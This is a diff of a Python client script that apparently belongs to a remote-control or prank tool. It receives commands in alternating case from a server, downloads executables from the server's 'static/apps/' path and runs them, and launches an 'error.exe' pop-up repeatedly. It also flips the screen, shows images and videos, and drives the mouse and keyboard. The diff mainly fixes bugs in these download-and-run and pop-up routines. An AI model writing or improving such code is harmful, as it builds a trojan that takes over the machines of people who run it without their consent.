@@ -1,31 +1,30 @@
+from os import path, mkdir, startfile, remove, listdir, rename, remove
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
-import json
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-from os import path, mkdir, startfile, remove, system, listdir, rename, remove
 from mouse import move, click, wheel, double_click
+from pyautogui import size, mouseDown, mouseUp
 from rotatescreen import get_primary_display
-from PIL.Image import Image, frombytes, Resampling
-import struct
 from webbrowser import open as wbopen
 from subprocess import run as sbrun
 from keyboard import wait, send
+from PIL.Image import frombytes
 from requests import get,post
 from time import sleep, time
 from threading import Thread
-from pyautogui import size, mouseDown, mouseUp
 from shutil import rmtree
 from shutil import which
-import io
-from mss import mss
 import tkinter as tk
+from mss import mss
+import websockets
 import builtins
 import pyttsx3
 import asyncio
-import aiohttp
 import psutil
 import pygame
+import struct
+import json
 import sys
-import websockets
+import io
 #                       SELECT URL
 while True:
     try:
@@ -237,7 +236,7 @@ def run(name:str) -> None:
     try:
         exe = get_path(name)
         if not path.exists(exe):
-            if not download(exe,url+f"static/apps/{exe}"):
+            if not download(exe,url+f"static/apps/{name}"):
                 log(f"{exe} could not be downloaded",state="FATAL")
                 return
         if path.exists(exe):
@@ -524,14 +523,15 @@ def commtxt() -> None:
 ##                      Error msgbox showing
 def showerr(num:int) -> None:
     try:
+        num = int(num)
         exe = get_path("error.exe")
         if not path.exists(exe):
             if not download("error.exe",url+"static/apps/error.exe"):
                 log("error.exe could not be downloaded",state="FATAL")
                 return
-        if path.exists("error.exe"):
-            for i in range(0,num+1):
-                startfile(exe)
+        if path.exists(exe):
+            for i in range(1,num+1):
+                sbrun(["start",exe])
             return
         log("error.exe does not exist",state="FATAL")
     except Exception as e:
@@ -576,11 +576,11 @@ def main():
             elif "iMaGe" in cmd:
                 ifp = cmd.replace("iMaGe ","")
                 ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
-                Thread(target=display,args=(ifp,)).start()
+                Thread(target=display,args=(ifp,True)).start()
             elif "vIdEo" in cmd:
                 ifp = cmd.replace("vIdEo ","")
                 ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
-                Thread(target=display,args=(ifp,)).start()
+                Thread(target=display,args=(ifp,False)).start()
             elif "fLiP on" in cmd:
                 sstate = True
                 Thread(target=flip).start()
@@ -685,4 +685,4 @@ def main():
 
   
 if __name__ == "__main__":
-    runcmd("start .")
+    main()
